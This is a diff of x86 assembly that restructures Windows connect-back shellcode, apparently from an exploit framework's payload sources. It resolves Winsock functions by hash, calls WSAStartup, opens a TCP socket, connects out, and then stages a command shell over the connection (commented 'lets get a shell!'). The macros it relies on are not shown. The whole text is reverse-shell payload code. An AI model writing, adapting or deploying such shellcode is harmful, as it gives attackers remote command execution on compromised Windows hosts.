@@ -16,33 +16,38 @@ KERNEL32_INIT
   _WSA_INIT_TB_WSASTART
 %endmacro
 
-; setup ebp for WSAStartup data
-push BYTE 20  ; push 20
-pop eax       ; register
-mul eax       ; square that shit = 0x190
-sub esp, eax  ; make room for WSAStartup data
-mov ecx, esp
-; setup ebp for address table
-sub esp, BYTE (_WSA_INIT_TBLEN * 4)
-push edi      ; [ebp + 8] = LoadLibraryA
-push esi      ; [ebp + 4] = LGetProcAddress
-push ebx      ; [ebp + 0] = kernel32 dll base
-mov ebp, esp
-push ecx      ; push WSAStartup data address
-push eax      ; push 0x190
 
-; hash the table
-WSA_HASH_WINSOCK
+make_startup_room:         ; setup ebp for WSAStartup data
+  push BYTE 20             ; push 20
+  pop eax                  ; register
+  mul eax                  ; square that shit = 0x190
+  sub esp, eax             ; make room for WSAStartup data
+  mov ecx, esp
 
-; call WSAStartup
-WSA_CALL_WSASTART
+make_table_room:           ; setup ebp for address table
+  sub esp, BYTE (_WSA_INIT_TBLEN * 4)
+  push edi                 ; [ebp + 8] = LoadLibraryA
+  push esi                 ; [ebp + 4] = LGetProcAddress
+  push ebx                 ; [ebp + 0] = kernel32 dll base
+  mov ebp, esp
+  push ecx                 ; push WSAStartup data address
+  push eax                 ; push 0x190
 
-; call WSASocketA, get a tcp socket (screw the stack)
-WSA_CALL_SOCKET 0, 'tcp'
+make_table:                ; hash the table
+  WSA_HASH_WINSOCK
 
-; we got the socket in edi
+wsa_startup:
+  ; call WSAStartup
+  WSA_CALL_WSASTART
 
-WSA_CALL_CONNECT 0
+make_socket:
+  ; call WSASocketA, get a tcp socket (screw the stack)
+  WSA_CALL_SOCKET 'tcp'
+  ; we got the socket in edi
 
-; ebp is still setup right, and so is edi, lets get a shell!
-STAGE_WSA_SHELL 1  ; resolve it's own functions
+connect_socket:
+  WSA_CALL_CONNECT 0
+
+get_shell:
+  ; ebp is still setup right, and so is edi, lets get a shell!
+  STAGE_WSA_SHELL 1  ; resolve it's own functions
